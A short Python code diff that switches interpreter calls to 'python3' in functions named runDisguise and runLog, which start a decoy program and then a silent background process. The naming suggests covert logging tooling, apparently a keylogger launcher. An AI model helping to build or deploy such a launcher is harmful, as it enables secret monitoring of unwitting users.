@@ -13,7 +13,10 @@ else:
 
 def runDisguise():
     programPath = os.path.join(path, "test.py")
-    subprocess.run(["python", programPath])
+    if platform.system() == "Windows":
+        subprocess.run(["python", programPath])
+    else:
+        subprocess.run(["python3", programPath])
     runLog()
 
 def runLog():
@@ -26,7 +29,7 @@ def runLog():
             stderr=subprocess.DEVNULL,
             stdout=subprocess.DEVNULL)
     else:
-        log_process = subprocess.Popen(["python", programPath],
+        log_process = subprocess.Popen(["python3", programPath],
                         stdin=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL,
                         stdout=subprocess.DEVNULL)
